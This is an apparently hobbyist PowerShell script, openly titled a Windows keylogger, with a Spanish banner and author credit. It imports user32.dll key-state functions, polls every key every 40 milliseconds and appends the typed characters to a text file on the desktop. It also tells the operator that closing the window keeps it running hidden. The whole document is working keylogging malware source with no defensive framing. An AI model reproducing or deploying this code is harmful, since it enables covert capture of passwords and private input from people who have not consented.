# Windows Keylogger:
Clear-Host
Write-Host ""
Write-Host "  ██   ██ ███████ ██    ██ ██       ██████   ██████  ███████ ██████  " -ForegroundColor Red
Write-Host "  ██   █  ██      ██    ██ ██      ██    ██ ██       ██      ██   ██ " -ForegroundColor Red
Write-Host "  ███████ █████   ████  ██ ██      ██    ██ ██   ███ █████   ██████  " -ForegroundColor Red
Write-Host "  ██   █  ██            ██ ██      ██    ██ ██    ██ ██      ██   ██ " -ForegroundColor Red
Write-Host "  ██   ██ ███████     ███  ███████  ██████   ██████  ███████ ██   ██ " -ForegroundColor Red
Write-Host ""
Write-Host "       Creado por Ruben Guerrero Muñoz - 2025" -ForegroundColor Yellow
Write-Host ""
Write-Host " [+] Inicio del keylogger" -ForegroundColor Green
Write-Host ""

# Preguntar por el nombre del archivo
$fileName = Read-Host "Dime como llamaremos al archivo (EJ: keylogger.txt) - Enter para usar 'keylogger.txt'"
if ([string]::IsNullOrWhiteSpace($fileName)) {
    $fileName = "keylogger.txt"
}

# Ruta donde se guardará
$path = "$env:USERPROFILE\Desktop\$fileName"

Write-Host ""
Write-Host " [*] El log se guardará en: $path" -ForegroundColor Cyan
Write-Host " [*] Para mantener oculto el servicio, cierre esta ventana" -ForegroundColor Yellow
Write-Host " [*] Para detener el keylogger, ejecute en PowerShell:" -ForegroundColor Yellow
Write-Host "     Get-WmiObject Win32_Process | Where-Object { `$_.CommandLine -like '*$($MyInvocation.MyCommand.Definition)*' } | ForEach-Object { Stop-Process -Id `$_.ProcessId -Force }" -ForegroundColor DarkGray
Write-Host ""
Write-Host " [OK] Keylogger iniciado..." -ForegroundColor Green
Write-Host ""

if ((Test-Path $path) -eq $false) {New-Item $path | Out-Null}

$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

try {
    while ((Test-Path $path) -ne $false) {
        Start-Sleep -Milliseconds 40
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                if ($success -and (Test-Path $path) -eq $true) {
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
    }
} finally {
    exit
}
